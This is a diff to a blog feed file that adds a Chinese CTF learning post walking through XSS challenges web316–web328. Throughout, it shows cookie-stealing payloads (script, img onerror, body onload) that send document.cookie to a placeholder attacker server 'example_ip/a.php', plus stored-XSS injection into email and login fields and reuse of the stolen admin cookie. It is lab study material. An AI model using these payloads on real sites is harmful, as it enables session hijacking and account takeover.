@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>XSS学习1</title>
+      <link href="/2026/07/24/XSS%E5%AD%A6%E4%B9%A01/"/>
+      <url>/2026/07/24/XSS%E5%AD%A6%E4%B9%A01/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 align="center">XSS学习1</h1><h3 align="right">edited by twi1igh7</h3><h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p>提前在自己的云服务器上配好用于接收cookie的脚本，然后直接上payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href=&quot;http://example_ip/a.php?cookie=&quot;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><code>location.href</code>的意思是跳转到目标网址，带上cookie</p><p><img src="https://gitee.com/walking-in-the-dark-alley/pic/raw/master/blog/26-07-24T152459.png" alt="image-20260724152452851"></p><h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>这道题过滤了<code>script</code>，可以用别的标签，例如<code>img</code>（但是不知道为什么ima标签一直失败，问了ai说可能是因为<code>onerror</code> 只有图片加载失败时才执行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><p>成功弹窗</p><p><img src="https://gitee.com/walking-in-the-dark-alley/pic/raw/master/blog/26-07-24T154615.png" alt="image-20260724154615427"></p><p>刚开始怀疑这道题感觉是机器人有问题，没有显示flag</p><p>但是用<code>body</code>标签又可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;location.href=&#x27;http://example_ip/a.php?cookie=&#x27;+document.cookie&quot;;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/walking-in-the-dark-alley/pic/raw/master/blog/26-07-24T163848.png" alt="image-20260724163848089"></p><h1 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h1><p>这道题过滤了<code>img</code>标签，我们换用body</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;window.location.href=&#x27;http://example_ip/a.php?cookie=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/walking-in-the-dark-alley/pic/raw/master/blog/26-07-24T164520.png" alt="image-20260724164520358"></p><h1 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h1><p>不知道过滤了啥，继续用body打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;window.location.href=&#x27;http://example_ip/a.php?cookie=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h1><p>这道题过滤了空格</p><p>但是不妨碍我们继续使用上面payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;window.location.href=&#x27;http://example_ip/a.php?cookie=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="web321-web326"><a href="#web321-web326" class="headerlink" title="web321-web326"></a>web321-web326</h1><p>用body便签这个payload都能打通</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;windows.location.href=&#x27;http://example_ip/a.php?cookie=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h1><p>这道题开始就是存储型xss了，这里就是一个发邮件的东西，我们的目的是要收件人点击我们的恶意链接，所以收件人填admin，payload可以写在正文中或者写在发件人中都行</p><p><img src="https://gitee.com/walking-in-the-dark-alley/pic/raw/master/blog/26-07-24T180103.png" alt="image-20260724180103092"></p><p>payload还是填之前好用的body打法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;window.location.href=&#x27;http://example_ip/a.php?cookie=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/walking-in-the-dark-alley/pic/raw/master/blog/26-07-24T180415.png" alt="image-20260724180415330"></p><p><img src="https://gitee.com/walking-in-the-dark-alley/pic/raw/master/blog/26-07-24T180449.png" alt="image-20260724180449471"></p><h1 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h1><p>这道题的打法就是在用户名和密码那里都输入payload，而且这道题把body给ban了，但是又把script给放出来，返璞归真用script打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href=&#x27;http://example_ip/a.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>原理就是账密存入后端后，管理员查看的时候执行，把admin的cookie发给我们，我们再利用admin的cookie进行登录，即可查看flag</p><p><img src="https://gitee.com/walking-in-the-dark-alley/pic/raw/master/blog/26-07-24T221156.png" alt="image-20260724221156292"></p><p>但是这道题有点抽象，首先admin的cookie会刷新，我们得尽快完成请求。其次就是我在hackbar里面改了cookie，但是请求的接口一直用的原来的cookie，也是很迷惑的操作了，后来看了几个wp，有个师傅说单独对该接口进行请求才能成功</p><p><img src="https://gitee.com/walking-in-the-dark-alley/pic/raw/master/blog/26-07-24T221715.png" alt="image-20260724221715701"></p><h1 id="一些后记"><a href="#一些后记" class="headerlink" title="一些后记"></a>一些后记</h1><p>后面的存储型xss我就不做了，感觉都没办法验证是否有xss漏洞，但是wp就是说得这么做，后面就去别的靶场找些题来做吧。</p><p>周末快乐鸭O(∩_∩)O</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+          <category> XSS </category>
+          
+          <category> 学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web </tag>
+            
+            <tag> XSS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SQL注入学习2</title>
       <link href="/2026/07/23/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A02/"/>
       <url>/2026/07/23/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A02/</url>
